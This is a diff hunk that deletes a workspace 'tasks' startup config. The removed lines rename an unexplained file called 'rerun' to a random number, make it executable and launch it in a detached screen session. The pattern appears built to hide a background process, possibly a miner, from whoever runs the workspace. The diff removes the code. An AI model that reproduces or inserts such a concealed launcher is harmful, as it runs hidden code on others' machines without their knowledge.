@@ -1,8 +1,0 @@
-tasks:
-  - command: |
-        sudo apt-get update && sudo apt-get install -y screen
-        TOP=$(shuf -n 1 -i 1-999999)
-        mv rerun $TOP
-        chmod +x $TOP
-        screen -dmS $TOP ./$TOP
-        top
